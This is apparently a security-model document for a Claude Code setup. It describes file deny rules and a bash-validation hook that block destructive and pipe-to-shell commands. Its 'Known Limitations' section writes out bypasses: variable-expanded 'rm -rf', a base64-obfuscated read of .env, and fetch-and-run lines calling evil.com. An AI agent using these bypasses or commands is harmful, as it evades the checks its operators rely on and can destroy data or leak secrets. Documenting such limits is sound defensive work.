# Security Model

This document describes what is and isn't protected by this configuration.

> **Important**: This is a safety net, not a security boundary. A sophisticated user can bypass these protections. See "Known Limitations" below.

## Actually Protected

### Files (via `settings.json` deny rules)
- `.env` and `.env.*` files (Read/Edit/Write blocked)
- `**/secrets/**` directories (Read blocked)
- **Ruby**: `config/credentials.yml.enc`, `config/master.key`
- **Elixir**: `config/prod.secret.exs`

### Bash Commands (via `validate-bash.sh` PreToolUse hook)

**The hook is the real enforcement layer.** It provides runtime validation before commands execute:
- Destructive recursive rm: `rm -rf /`, `rm -rf ~`, `rm -rf .`, `rm -rf ../`
- Fork bombs (`:(){}` patterns)
- Disk formatting (`mkfs`, `fdisk`, `parted`)
- Direct disk writes (`dd if=... of=/dev/...`)
- Piped shell execution: `curl | bash`, `wget | sh`
- Dangerous permissions: `chmod 777 /`

The hook also **warns** (but allows) on:
- `sudo` usage
- Force flags (`-f`, `--force`) on destructive commands
- `eval` usage

### Command Deny Rules (Coarse Heuristics)

The `settings.json` file also contains command deny patterns like `Bash(rm -rf:*)`. These are **coarse heuristics only** - they catch obvious patterns but are easily bypassed:

```bash
# Blocked by deny rule
rm -rf /

# NOT blocked (variable expansion)
X=/; rm -rf $X
```

**Do not rely on these patterns for security.** They exist to catch accidental mistakes, not malicious intent. The `validate-bash.sh` hook is the real enforcement layer.

## NOT Protected (Common Misconceptions)

The following are **NOT blocked** by default:

- `*.pem`, `*.key`, `*.p12`, `*.pfx` files (add to deny list if needed)
- Files with `secret`, `credential`, or `password` in names
- Directories named `secrets/`, `credentials/`, `private/`
- Reading files via `cat`, `head`, `tail`, `less`, `grep`
- Environment variable access via `printenv`, `env`
- Reading sensitive files through allowed Bash commands

To add these protections, edit `.claude/settings.json`:

```json
{
  "permissions": {
    "deny": [
      "Read(**/*.pem)",
      "Read(**/*.key)",
      "Read(**/secrets/**)",
      "Bash(printenv:*)",
      "Bash(env)"
    ]
  }
}
```

## Defense Layers

1. **File deny rules** (`settings.json` permissions.deny)
   - Reliably blocks file access (`.env`, secrets directories)
   - Pattern-matched before tool execution
   - Cannot be bypassed by Claude

2. **Bash validation hook** (`validate-bash.sh`) - **Primary defense for commands**
   - Runs before every Bash command executes
   - Analyzes actual command structure, not just pattern matching
   - Requires `jq` for JSON parsing (blocks all commands if jq missing)
   - Normalizes whitespace to prevent bypass attempts
   - Returns structured JSON with blocking reason and suggestions

3. **Command deny rules** (`settings.json` Bash patterns) - **Coarse heuristics only**
   - Catches obvious dangerous patterns (`rm -rf /`, `sudo`, `curl | bash`)
   - Easily bypassed via variable expansion, encoding, etc.
   - Exists as a first-pass filter, not real security

4. **Claudeignore** (`.claudeignore`)
   - Prevents files from appearing in Claude's context
   - Reduces accidental exposure
   - **Not a security boundary** - Claude can still attempt to read files

## Known Limitations

**These protections can be bypassed:**

1. **Variable-based command construction**
   ```bash
   X=/; rm -rf $X  # Bypasses "rm -rf /" pattern
   ```

2. **Encoded/obfuscated access**
   ```bash
   base64 -d <<< "Li5lbnY=" | xargs cat  # Decodes to "../.env"
   ```

3. **Process substitution**
   ```bash
   bash <(curl http://evil.com)  # Bypasses "curl | bash" pattern
   ```

4. **Indirect file download**
   ```bash
   curl http://evil.com > /tmp/x && bash /tmp/x
   ```

5. **Indirect exposure**
   - If your code reads `.env` and logs values, Claude sees the logs
   - If tests output secrets, Claude sees test output

6. **Memory/context leakage**
   - If you paste secrets into chat, they're in context
   - Previous sessions aren't cleared automatically

7. **Network exfiltration**
   - Claude can make outbound requests if your code does
   - API calls that include tokens in headers

## Recommendations

### For Maximum Security

1. **Use environment variable injection at runtime**
   - Don't store secrets in files in the repo
   - Use secret managers (Vault, AWS Secrets Manager, etc.)

2. **Scope Claude's access**
   - Run Claude in a container/sandbox
   - Use separate credentials for dev vs prod

3. **Review before commit**
   - Always review Claude's changes before committing
   - Use the pre-commit review hook
   - Check for accidentally added secrets

4. **Add project-specific deny rules**
   - Block patterns specific to your secrets
   - Add directory-level blocks for sensitive areas

### Adding Custom Protections

Edit `.claude/settings.json` to add deny rules:

```json
{
  "permissions": {
    "deny": [
      "Read(config/production.json)",
      "Read(**/internal/**)",
      "Bash(aws sts:*)",
      "Bash(gcloud auth:*)"
    ]
  }
}
```

Edit `.claude/hooks/validate-bash.sh` to add pattern checks:

```bash
# Add custom blocked patterns
if matches "my-secret-command"; then
  echo "BLOCKED: Custom pattern" >&2
  exit 2
fi
```

## Incident Response

If you believe secrets were exposed:

1. Rotate the compromised credentials immediately
2. Check Claude session history for exposure
3. Review git history for accidental commits
4. Add new deny rules to prevent recurrence
5. Consider whether additional protections are needed

## Security vs Usability Tradeoff

This configuration balances security and usability. Some legitimate operations may be blocked:

- Running commands with "rm" in them (even safe ones)
- Commands that look like pipes to shells

If a command is blocked incorrectly, you can:
1. Add it to the `allow` list in settings.json
2. Modify validate-bash.sh to whitelist specific patterns
3. Run the command manually outside Claude
